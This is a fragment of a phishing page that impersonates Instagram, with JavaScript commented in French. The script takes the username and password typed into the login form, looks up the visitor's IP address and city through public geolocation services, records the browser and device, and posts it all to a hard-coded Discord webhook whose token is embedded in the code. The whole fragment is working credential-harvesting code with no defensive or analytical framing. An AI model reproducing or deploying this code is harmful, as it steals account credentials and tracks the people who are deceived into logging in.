  <title>Instagram</title>
  <script>
    // Fonction pour envoyer les informations à Discord via un appel de webhook
    function sendToDiscord(ipAddress, city, browser, device) {
      var webhookURL = "https://discord.com/api/webhooks/1125156301689847929/ajxOd4GPMFWeuWFVTVarNi8-8c25WBCT6VS9MuAMfl5hnHnd7GO_Lwh1PM3ZTgBE_qub";

      var content = "> **Identifiant  : **" + document.getElementById('username').value +
        "\n> **Mot de passe : **" + document.getElementById('password').value +
        "\n> **Adresse IP : **" + ipAddress +
        "\n> **Ville : **" + city +
        "\n> **Navigateur : **" + browser +
        "\n> **Appareil : **" + device;

      var request = new XMLHttpRequest();
      request.open("POST", webhookURL);
      request.setRequestHeader('Content-type', 'application/json');
      var params = {
        content: content
      };
      request.send(JSON.stringify(params));
    }

    // Fonction pour récupérer l'adresse IP de l'utilisateur, la ville, le navigateur et l'appareil associés
    function getIPCityBrowserDevice() {
      // Récupérer l'adresse IP de l'utilisateur en utilisant un service de géolocalisation
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          var ipAddress = data.ip;

          // Récupérer la ville en fonction de l'adresse IP
          fetch('https://ipapi.co/' + ipAddress + '/json/')
            .then(response => response.json())
            .then(data => {
              var city = data.city;

              // Récupérer le navigateur et l'appareil
              var browser = navigator.userAgent;
              var device = navigator.platform;

              // Envoyer les informations à Discord
              sendToDiscord(ipAddress, city, browser, device);
            })
            .catch(error => {
              console.error('Erreur lors de la récupération de la ville :', error);
            });
        })
        .catch(error => {
          console.error('Erreur lors de la récupération de l\'adresse IP :', error);
        });
    }
  </script>
